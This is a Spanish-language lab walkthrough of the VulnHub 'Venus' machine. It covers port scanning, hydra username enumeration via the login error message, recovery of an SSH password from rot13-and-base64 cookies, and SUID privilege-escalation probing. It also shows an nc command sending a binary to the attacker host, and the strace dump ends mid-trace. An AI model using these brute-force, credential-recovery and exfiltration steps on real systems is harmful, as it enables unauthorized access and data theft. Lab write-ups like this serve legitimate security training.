# Venus

https://www.vulnhub.com/entry/the-planets-venus,705/

## 1. Enumeración

IP Atacante: 10.0.12.25
IP Victima: 10.0.12.26

## 2. Servicios

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.5 (protocol 2.0)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.9.5
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=2/20%Time=67B74D38%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,363,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2020\x20Feb\x
SF:202025\x2015:41:44\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.9
SF:\.5\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:
SF:\x20DENY\r\nContent-Length:\x20626\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nReferrer-Policy:\x20same-origin\r\n\r\n<html>\n<head>\n<title>Venu
SF:s\x20Monitoring\x20Login</title>\n<style>\n\.aligncenter\x20{\n\x20\x20
SF:\x20\x20text-align:\x20center;\n}\nlabel\x20{\n\x20\x20\x20\x20display:
SF:block;\n\x20\x20\x20\x20position:relative;\n}\n</style>\n</head>\n<body
SF:>\n<h1>\x20Venus\x20Monitoring\x20Login\x20</h1>\n<h2>Please\x20login:\
SF:x20</h2>\nCredentials\x20guest:guest\x20can\x20be\x20used\x20to\x20acce
SF:ss\x20the\x20guest\x20account\.\n<form\x20action=\"/\"\x20method=\"post
SF:\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\x20\x20<label\x20for=\"usernam
SF:e\">Username:</label>\n\x20\x20\x20\x20<input\x20id=\"username\"\x20typ
SF:e=\"text\"\x20name=\"username\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\x
SF:20\x20<label\x20for=\"password\">Password:</label>\n\x20\x20\x20\x20<in
SF:put\x20id=\"username\"\x20type=\"text\"\x20name=\"password\">\n\x20\x20
SF:\x20\x20<br\x20/>\n\x20\x20\x20\x20<input\x20type=\"submit\"\x20value=\
SF:"Login\">\n</form>\n\n</body>\n</html>\n")%r(HTTPOptions,363,"HTTP/1\.1
SF:\x20200\x20OK\r\nDate:\x20Thu,\x2020\x20Feb\x202025\x2015:41:44\x20GMT\
SF:r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.9\.5\r\nContent-Type:\x20te
SF:xt/html;\x20charset=utf-8\r\nX-Frame-Options:\x20DENY\r\nContent-Length
SF::\x20626\r\nX-Content-Type-Options:\x20nosniff\r\nReferrer-Policy:\x20s
SF:ame-origin\r\n\r\n<html>\n<head>\n<title>Venus\x20Monitoring\x20Login</
SF:title>\n<style>\n\.aligncenter\x20{\n\x20\x20\x20\x20text-align:\x20cen
SF:ter;\n}\nlabel\x20{\n\x20\x20\x20\x20display:block;\n\x20\x20\x20\x20po
SF:sition:relative;\n}\n</style>\n</head>\n<body>\n<h1>\x20Venus\x20Monito
SF:ring\x20Login\x20</h1>\n<h2>Please\x20login:\x20</h2>\nCredentials\x20g
SF:uest:guest\x20can\x20be\x20used\x20to\x20access\x20the\x20guest\x20acco
SF:unt\.\n<form\x20action=\"/\"\x20method=\"post\">\n\x20\x20\x20\x20<br\x
SF:20/>\n\x20\x20\x20\x20<label\x20for=\"username\">Username:</label>\n\x2
SF:0\x20\x20\x20<input\x20id=\"username\"\x20type=\"text\"\x20name=\"usern
SF:ame\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\x20\x20<label\x20for=\"pass
SF:word\">Password:</label>\n\x20\x20\x20\x20<input\x20id=\"username\"\x20
SF:type=\"text\"\x20name=\"password\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x2
SF:0\x20\x20<input\x20type=\"submit\"\x20value=\"Login\">\n</form>\n\n</bo
SF:dy>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.10 seconds

## 3. Enumeración Web

Tenemos una pagina principal que nos pide credenciales para acceder, podemos usar `guest:guest`.
Dentro no hay gran cosa, pero obtenemos una cookie en b64 `auth:""Z3Vlc3Q6dGhyZmc=""` si lo descodificamos obtenemos `guest:thrfg`, sabiendo que las credenciales son `guest:guest` podemos asumir que la cookie es `guest:guest`, solo que cifrada usando `rot13`.

Lanzamos `dirb http://10.0.12.26:8080/` y encontramos la ruta `/admin` que nos lleva a un panel de login.

Para conseguir acceder al panel de admin, podemos usar `guest:guest` y en la cookie `auth` poner `admin:admin` cifrado en rot13.

Intentamos crear una cookie con el valor adecuado:

```
admin:admin > admin:nqzva > YWRtaW46bnF6dmE=
```

Pero no funciona :(

Deberemos buscar otra forma de acceder al panel de admin.

Vamos a intentar sacar usuarios con `hydra` usando la password por defecto `guest` y el mensaje de error que inyecta en la página cuando el usuario no es correcto, `Invalid username.`.

```
hydra -L ~/Descargas/usernames.txt -p guest -s 8080 10.0.12.26 http-post-form "/:username=^USER^&password=^PASS^:Invalid username."
```

Encontramos los siguientes usuarios:

```
[8080][http-post-form] host: 10.0.12.26   login: guest   password: guest
[8080][http-post-form] host: 10.0.12.26   login: magellan   password: guest
[8080][http-post-form] host: 10.0.12.26   login: venus   password: guest
```

Iniciamos sesion con `magellan:guest` y miramos su token: `"bWFnZWxsYW46aXJhaGZ2bmF0cmJ5YnRsMTk4OQ=="` que descodificamos a `magellan:irahfvnatrbybtl1989`, tras pasar por rot13 tendriamos: `magellan:venusiangeology1989`.

Intentamos iniciar sesion ssh con las credenciales:

```
datadiego@~ ssh magellan@10.0.12.26 -p 22
magellan@10.0.12.26's password: 
Last failed login: Fri Feb 21 15:59:31 GMT 2025 from 10.0.12.25 on ssh:notty
There were 2 failed login attempts since the last successful login.
[magellan@venus ~]$ whoami
magellan
```

## 4. Escalada de privilegios

Volvemos a usar el comando de la anterior maquina de la serie `find / -perm -u=s -type f 2>/dev/null`

Encontramos varios binarios con permisos de setuid:

```
[magellan@venus ~]$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/cockpit-session
```

Vamos a intentar usar `pkexec` para ejecutar comandos como root.

```bash
[magellan@venus ~]$ pkexec 
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ====
Authentication is needed to run `/bin/bash' as the super user
Authenticating as: root
Password: 
polkit-agent-helper-1: pam_authenticate failed: Authentication failure
==== AUTHENTICATION FAILED ====
```

No podemos usar `pkexec` para ejecutar comandos como root.

Del resto de binarios, `cockpit-session` llama la atención, pero no podemos ejecutarlo, aun nos queda `polkit-agent-helper-1`.

```bash
[magellan@venus ~]$ /usr/lib/polkit-1/polkit-agent-helper-1
polkit-agent-helper-1: wrong number of arguments. This incident has been logged.
FAILURE
[magellan@venus ~]$ 
```

Parece que espera argumentos, si mandamos 1234, la consola se queda colgada.

Vamos a descargar el binario para analizarlo en nuestra maquina con nc:

En la maquina atacante:

```bash
datadiego@~ nc -lvp 8888 > polkit-agent-helper-1
Listening on 0.0.0.0 8888
```

En la maquina victima:

```
[magellan@venus polkit-1]$ cat polkit-agent-helper-1 | nc 10.0.12.25 8888
```

## Analisis del binario

### strings

```
/lib64/ld-linux-x86-64.so.2
&*iE
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
__cxa_finalize
__libc_start_main
g_strdup
strlen
stdout
__fprintf_chk
g_strescape
fputs
fputc
fflush
g_free
calloc
stdin
fgets
memset
__stack_chk_fail
__getdelim
g_strchomp
feof
perror
polkit_authority_get_sync
polkit_unix_user_new_for_name
polkit_authority_authentication_agent_response_sync
g_object_unref
g_printerr
g_error_free
stderr
fileno
fdatasync
usleep
pam_end
fwrite
setenv
geteuid
openlog
getuid
isatty
pam_start
pam_set_item
pam_authenticate
pam_acct_mgmt
pam_get_item
strcmp
__syslog_chk
g_strdup_printf
pam_strerror
libpam.so.0
libpolkit-gobject-1.so.0
libgobject-2.0.so.0
libglib-2.0.so.0
libc.so.6
__libc_csu_fini
flush_and_wait
_IO_stdin_used
__data_start
send_dbus_message
__libc_csu_init
__bss_start
read_cookie
_edata
_polkit_clearenv
LIBPAM_1.0
GLIBC_2.4
GLIBC_2.3.4
GLIBC_2.2.5
AVAUA
D$(1
toE1
D$(dH+
[]A\A]A^
u+UH
ATUSH
[]A\A]
AWHc
AVAUATI
[]A\A]A^A_
AUATI
[]A\A]A^
[]A\A]A^A_
PAM_PROMPT_ECHO_OFF
PAM_PROMPT_ECHO_ON
PAM_ERROR_MSG
PAM_TEXT_INFO
getline
Error getting authority: %s
/usr/sbin:/usr/bin:/sbin:/bin
PATH
polkit-agent-helper-1
polkit-1
SUCCESS
FAILURE
Error constructing identity: %s
polkit-agent-helper-1: error response to PolicyKit daemon: %s
polkit-agent-helper-1: needs to be setuid root
Incorrect permissions on %s (needs to be setuid root)
inappropriate use of helper, wrong number of arguments [uid=%d]
polkit-agent-helper-1: wrong number of arguments. This incident has been logged.
inappropriate use of helper, stdin is a tty [uid=%d]
polkit-agent-helper-1: inappropriate use of helper, stdin is a tty. This incident has been logged.
polkit-agent-helper-1: pam_start failed: %s
polkit-agent-helper-1: pam_set_item failed: %s
polkit-agent-helper-1: pam_authenticate failed: %s
polkit-agent-helper-1: pam_acct_mgmt failed: %s
polkit-agent-helper-1: pam_get_item failed: %s
polkit-agent-helper-1: Tried to auth user '%s' but we got auth for user '%s' instead
:*3$"
3g958
annobin gcc 11.0.0 20210116
running gcc 11.0.0 20210123
GA*FORTIFY
GA+GLIBCXX_ASSERTIONS
GA*GOW
GA*cf_protection
GA+omit_frame_pointer
GA+stack_clash
GA!stack_realign
GA*FORTIFY
GA+GLIBCXX_ASSERTIONS
GA*cf_protection
polkit-agent-helper-1-0.117-3.fc34.x86_64.debug
7zXZ
6F;$m
++iyk
A'_	!
hJ	B
x%Xq
tUQw\^U
sH}cHXqY
>rvH
Jm%itu
P4{@
{4$>Vw!
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.data.rel.ro
.dynamic
.got
.data
.bss
.gnu.build.attributes
.gnu_debuglink
.gnu_debugdata
```

### ltrace

```bash
datadiego@~ chmod +x polkit-agent-helper-1 
datadiego@~ ltrace ./polkit-agent-helper-1 
clearenv(1, 0x7fffb8736d98, 0x7fffb8736da8, 0) = 0
setenv("PATH", "/usr/sbin:/usr/bin:/sbin:/bin", 1) = 0
geteuid()                                      = 1000
fwrite("polkit-agent-helper-1: needs to "..., 1, 47, 0x745524e044e0polkit-agent-helper-1: needs to be setuid root
) = 47
g_strdup_printf(0x5f68f31c9160, 0x7fffb8738f63, 0, 47) = 0x5f690008c560
g_strdup(0x5f690008c560, 0x5f690008c560, 0, 0x5f690008c560) = 0x5f690008ef90
strlen("Incorrect permissions on ./polki"...)  = 74
__fprintf_chk(0x745524e045c0, 1, 0x5f68f31c9004, 0x5f68f31c902f) = 14
g_strescape(0x5f690008ef90, 0, 0, 0)           = 0x5f690008eff0
fputs("Incorrect permissions on ./polki"..., 0x745524e045c0) = 1
fputc('\n', 0x745524e045c0PAM_ERROR_MSG Incorrect permissions on ./polkit-agent-helper-1 (needs to be setuid root)
)                    = 10
fflush(0x745524e045c0)                         = 0
g_free(0x5f690008eff0, 0, 0x5f6900084530, 0x745524d1c574) = 18
g_free(0x5f690008ef90, 0x5f690008efe0, 0x5f690008e, 1) = 4
g_free(0x5f690008c560, 0x5f690008ef80, 0x5f690008e, 1) = 4
free(0)                                        = <void>
fwrite("FAILURE\n", 1, 8, 0x745524e045c0FAILURE
)      = 8
fflush(0x745524e045c0)                         = 0
fflush(0x745524e044e0)                         = 0
fileno(0x745524e045c0)                         = 1
fdatasync(1, 0, 0x745524e04563, 0)             = 0xffffffff
fileno(0x745524e044e0)                         = 2
fdatasync(2, 0, -120, 0x745524d1e754)          = 0xffffffff
usleep(100000)                                 = <void>
__cxa_finalize(0x5f68f31cac08, 26, 0, 0x7fffb8736ae0) = 1
+++ exited (status 1) +++
```

### strace

```bash
datadiego@~ strace ./polkit-agent-helper-1 | toclip 
execve("./polkit-agent-helper-1", ["./polkit-agent-helper-1"], 0x7fff72efad30 /* 52 vars */) = 0
brk(NULL)                               = 0x55c0819fe000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x706f93fbe000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No existe el archivo o el directorio)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=88059, ...}) = 0
mmap(NULL, 88059, PROT_READ, MAP_PRIVATE, 3, 0) = 0x706f93fa8000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpam.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=67888, ...}) = 0
mmap(NULL, 65552, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93f97000
mmap(0x706f93f9a000, 36864, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x706f93f9a000
mmap(0x706f93fa3000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xc000) = 0x706f93fa3000
mmap(0x706f93fa6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xf000) = 0x706f93fa6000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpolkit-gobject-1.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=125000, ...}) = 0
mmap(NULL, 127360, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93f77000
mmap(0x706f93f7e000, 61440, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7000) = 0x706f93f7e000
mmap(0x706f93f8d000, 32768, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16000) = 0x706f93f8d000
mmap(0x706f93f95000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d000) = 0x706f93f95000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgobject-2.0.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=399752, ...}) = 0
mmap(NULL, 404536, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93f14000
mmap(0x706f93f23000, 225280, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xf000) = 0x706f93f23000
mmap(0x706f93f5a000, 102400, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x46000) = 0x706f93f5a000
mmap(0x706f93f73000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5e000) = 0x706f93f73000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libglib-2.0.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=1343056, ...}) = 0
mmap(NULL, 1343952, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93dcb000
mmap(0x706f93de9000, 655360, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e000) = 0x706f93de9000
mmap(0x706f93e89000, 557056, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xbe000) = 0x706f93e89000
mmap(0x706f93f11000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x146000) = 0x706f93f11000
mmap(0x706f93f13000, 464, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x706f93f13000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
fstat(3, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93a00000
mmap(0x706f93a28000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x706f93a28000
mmap(0x706f93bb0000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0x706f93bb0000
mmap(0x706f93bff000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1fe000) = 0x706f93bff000
mmap(0x706f93c05000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x706f93c05000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libaudit.so.1", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=133200, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x706f93dc9000
mmap(NULL, 184496, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93d9b000
mmap(0x706f93d9e000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x706f93d9e000
mmap(0x706f93da6000, 86016, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb000) = 0x706f93da6000
mmap(0x706f93dbb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f000) = 0x706f93dbb000
mmap(0x706f93dbd000, 45232, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x706f93dbd000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgio-2.0.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=1887632, ...}) = 0
mmap(NULL, 1897376, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93830000
mmap(0x706f93869000, 1142784, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x39000) = 0x706f93869000
mmap(0x706f93980000, 479232, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x150000) = 0x706f93980000
mmap(0x706f939f5000, 36864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1c4000) = 0x706f939f5000
mmap(0x706f939fe000, 5024, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x706f939fe000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libsystemd.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=910592, ...}) = 0
mmap(NULL, 915016, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93cbb000
mmap(0x706f93cd1000, 585728, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16000) = 0x706f93cd1000
mmap(0x706f93d60000, 188416, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xa5000) = 0x706f93d60000
mmap(0x706f93d8e000, 49152, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xd2000) = 0x706f93d8e000
mmap(0x706f93d9a000, 1608, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x706f93d9a000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libffi.so.8", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=47672, ...}) = 0
mmap(NULL, 46608, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93caf000
mmap(0x706f93cb1000, 28672, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x706f93cb1000
mmap(0x706f93cb8000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9000) = 0x706f93cb8000
mmap(0x706f93cb9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xa000) = 0x706f93cb9000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libm.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=952616, ...}) = 0
mmap(NULL, 950296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93747000
mmap(0x706f93757000, 520192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x10000) = 0x706f93757000
mmap(0x706f937d6000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x8f000) = 0x706f937d6000
mmap(0x706f9382e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xe7000) = 0x706f9382e000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=625344, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x706f93cad000
mmap(NULL, 627472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93c13000
mmap(0x706f93c15000, 450560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x706f93c15000
mmap(0x706f93c83000, 163840, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x70000) = 0x706f93c83000
mmap(0x706f93cab000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x97000) = 0x706f93cab000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libcap-ng.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=26848, ...}) = 0
mmap(NULL, 28720, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f9373f000
mmap(0x706f93741000, 12288, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x706f93741000
mmap(0x706f93744000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x706f93744000
mmap(0x706f93745000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x706f93745000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgmodule-2.0.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=22736, ...}) = 0
mmap(NULL, 24712, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93738000
mmap(0x706f9373a000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x706f9373a000
mmap(0x706f9373c000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4000) = 0x706f9373c000
mmap(0x706f9373d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4000) = 0x706f9373d000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libz.so.1", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=113000, ...}) = 0
mmap(NULL, 110744, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f9371c000
mmap(0x706f9371e000, 73728, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x706f9371e000
mmap(0x706f93730000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x14000) = 0x706f93730000
mmap(0x706f93736000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a000) = 0x706f93736000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libmount.so.1", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=309960, ...}) = 0
mmap(NULL, 311896, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f936cf000
mmap(0x706f936d8000, 212992, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9000) = 0x706f936d8000
mmap(0x706f9370c000, 53248, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3d000) = 0x706f9370c000
mmap(0x706f93719000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x49000) = 0x706f93719000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
